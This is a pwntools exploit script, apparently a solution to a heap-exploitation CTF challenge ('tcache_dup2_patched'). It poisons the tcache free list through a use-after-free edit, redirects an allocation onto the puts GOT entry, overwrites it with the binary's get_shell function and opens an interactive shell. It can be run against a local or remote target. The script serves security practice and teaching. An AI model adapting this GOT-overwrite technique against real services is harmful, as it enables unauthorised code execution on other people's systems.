#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('tcache_dup2_patched')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *create_heap+94
b *delete_heap+152
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def create(size, data):
    io.sendlineafter(b">", "1")
    io.sendlineafter(b"Size:", str(size).encode())
    io.sendafter(b"Data:", data)


def edit(idx, size, data):
    io.sendlineafter(b">", "2")
    io.sendlineafter(b"idx:", str(idx).encode())
    io.sendlineafter(b"Size:", str(size).encode())
    io.sendafter(b"Data:", data)


def delete(idx):
    io.sendlineafter(b">", "3")
    io.sendlineafter(b"idx:", str(idx).encode())


def solve():
    puts_got = exe.got["puts"]
    win = exe.sym["get_shell"]

    create(0x20, b"A"*8)
    create(0x20, b"B"*8)

    delete(0)
    delete(1)

    edit(1, 0x10, p64(puts_got))

    create(0x20, b"A"*8)
    create(0x20, p64(win))
    
    # delete(0)
    # edit(0, 0x10, b"A"*9)
    # delete(0)

    # edit(0, 0x10, p64(puts_got))
    # create(0x20, b"B"*8)
    # create(0x20, p64(win))

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

